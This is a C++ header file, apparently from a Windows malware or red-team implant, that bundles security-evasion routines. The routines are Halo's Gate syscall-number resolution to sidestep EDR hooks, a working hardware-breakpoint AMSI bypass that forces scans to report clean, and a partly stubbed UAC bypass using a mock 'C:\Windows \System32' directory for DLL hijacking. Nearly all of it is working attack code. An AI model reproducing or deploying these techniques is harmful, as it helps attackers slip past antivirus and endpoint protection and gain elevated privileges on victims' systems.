#ifndef GOD_MODE_STEALTH_H
#define GOD_MODE_STEALTH_H

#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#include <vector>
#include "api_hashes.h"

// --- Halo's Gate: Dynamic SSN Resolution ---

static WORD GetSSN(uint32_t hash) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return 0;

    PBYTE pFunc = (PBYTE)ResolveApiByHash(hNtdll, hash);
    if (!pFunc) return 0;

    // Standard stub:
    // mov r10, rcx
    // mov eax, SSN
    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B && pFunc[2] == 0xD1 && pFunc[3] == 0xB8) {
        return *(WORD*)(pFunc + 4);
    }

    // If hooked (starts with JMP 0xE9), look up or down for neighboring syscalls
    if (pFunc[0] == 0xE9) {
        for (WORD idx = 1; idx <= 500; idx++) {
            // Check neighbor UP
            PBYTE pNeighbor = pFunc + (idx * 32);
            if (pNeighbor[0] == 0x4C && pNeighbor[1] == 0x8B && pNeighbor[2] == 0xD1 && pNeighbor[3] == 0xB8) {
                return *(WORD*)(pNeighbor + 4) - idx;
            }
            // Check neighbor DOWN
            pNeighbor = pFunc - (idx * 32);
            if (pNeighbor[0] == 0x4C && pNeighbor[1] == 0x8B && pNeighbor[2] == 0xD1 && pNeighbor[3] == 0xB8) {
                return *(WORD*)(pNeighbor + 4) + idx;
            }
        }
    }

    return 0;
}

// --- Hardware Breakpoint AMSI Bypass ---

static LONG CALLBACK HardwareBreakpointHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // Check if the exception address is AmsiScanBuffer
        // For simplicity, we just check if it's the one we set
        
        // Change the return value (RAX) to AMSI_RESULT_CLEAN (0)
        // and skip the function call
        ExceptionInfo->ContextRecord->Rax = 0; // AMSI_RESULT_CLEAN
        
        // Set the Instruction Pointer to the return address (what's on the stack)
        ExceptionInfo->ContextRecord->Rip = *(DWORD64*)(ExceptionInfo->ContextRecord->Rsp);
        
        // Adjust the stack pointer (remove return address)
        ExceptionInfo->ContextRecord->Rsp += 8;

        // Resume execution
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static BOOL BypassAMSI_HWBP() {
    HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) return FALSE;

    void* pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return FALSE;

    // Register the exception handler
    AddVectoredExceptionHandler(1, HardwareBreakpointHandler);

    // Get current thread context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();

    if (GetThreadContext(hThread, &ctx)) {
        // Set Dr0 to the address of AmsiScanBuffer
        ctx.Dr0 = (DWORD64)pAmsiScanBuffer;
        
        // Enable Dr0 for local execution
        // Dr7 L0=1 (bit 0), Condition=00 (execution, bits 16-17), Size=00 (1 byte, bits 18-19)
        ctx.Dr7 |= (1 << 0);
        ctx.Dr7 &= ~(3 << 16); // 00 = execute
        ctx.Dr7 &= ~(3 << 18); // 00 = 1 byte

        SetThreadContext(hThread, &ctx);
        return TRUE;
    }

    return FALSE;
}

// --- Stealthy UAC Bypass (Mock Directory) ---

static BOOL BypassUAC_MockDir(const wchar_t* payloadPath) {
    // 1. Create Mock Directory: "C:\Windows \System32"
    // The space at the end of "Windows " is the trick.
    // Windows Explorer and some APIs will normalize this to "C:\Windows\System32",
    // but the file system treats it as a distinct directory.
    
    wchar_t mockDir[] = L"\\\\?\\C:\\Windows \\";
    wchar_t mockSystem32[] = L"\\\\?\\C:\\Windows \\System32";
    
    if (!CreateDirectoryW(mockDir, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) return FALSE;
    if (!CreateDirectoryW(mockSystem32, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) return FALSE;

    // 2. Copy a trusted binary to the mock directory
    // e.g., computerdefaults.exe or systempropertiesadvanced.exe
    wchar_t targetExe[] = L"\\\\?\\C:\\Windows \\System32\\computerdefaults.exe";
    CopyFileW(L"C:\\Windows\\System32\\computerdefaults.exe", targetExe, FALSE);

    // 3. Perform DLL Hijacking in the mock directory
    // We would need to know which DLL computerdefaults.exe loads.
    // For this example, let's assume it's one we can proxy.
    
    // 4. Trigger execution
    // ShellExecuteW(NULL, L"open", L"C:\\Windows \\System32\\computerdefaults.exe", NULL, NULL, SW_HIDE);
    
    return TRUE; 
}

#endif // GOD_MODE_STEALTH_H
